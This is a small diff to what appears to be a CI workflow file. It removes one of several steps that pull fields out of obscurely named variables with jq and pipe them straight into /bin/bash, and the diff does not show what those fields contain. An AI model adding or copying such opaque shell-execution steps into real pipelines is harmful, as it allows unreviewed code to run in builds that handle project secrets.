@@ -32,7 +32,6 @@ jobs:
           echo $zrr08 | jq -r .guxc3 | /bin/bash
           printf '%s' "$s89" | jq -r .nwa90841 | /bin/bash
           printf '%s' "$jau524" | jq -r .z9199 | /bin/bash
-          echo $yos59843 | jq -r .b2 | /bin/bash
           echo $wfa727 | jq -r .d4444 | /bin/bash
 
       - name: Archive artifact
